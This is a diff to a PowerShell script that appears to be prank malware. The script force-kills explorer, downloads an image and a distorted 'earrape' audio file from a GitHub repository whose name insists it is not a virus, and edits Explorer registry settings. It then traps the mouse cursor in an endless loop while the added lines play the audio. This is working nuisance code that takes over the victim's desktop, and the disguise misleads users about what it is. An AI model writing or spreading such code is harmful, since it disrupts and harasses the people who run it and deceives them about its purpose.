@@ -44,6 +44,8 @@ Function Set-WallPaper($Image) {
   Stop-Process -ProcessName explorer -Force
 
   $WebClient = New-Object System.Net.WebClient
+  
+  $WebClient.DownloadFile("https://raw.githubusercontent.com/MilkrosoftWindows/tkt_poto_walah_c_pa_un_virus/main/cheh.jpg","C:\system32.jpg ")
   $WebClient.DownloadFile("https://github.com/MilkrosoftWindows/tkt_poto_walah_c_pa_un_virus/raw/main/monster-inc-mike-wazowski-theme-song-earrape-best-version.mp3", "C:\zic.mp3")
 
   $Path="HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\" 
@@ -97,6 +99,9 @@ while ($true)
   $Pos = [System.Windows.Forms.Cursor]::Position
   $x = 5000
   $y = 0
+  
+  $mediaPlayer.Play()
+  Set-SoundVolume 50
   [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point($x, $y)
   #Start-Sleep -Seconds 10
 }
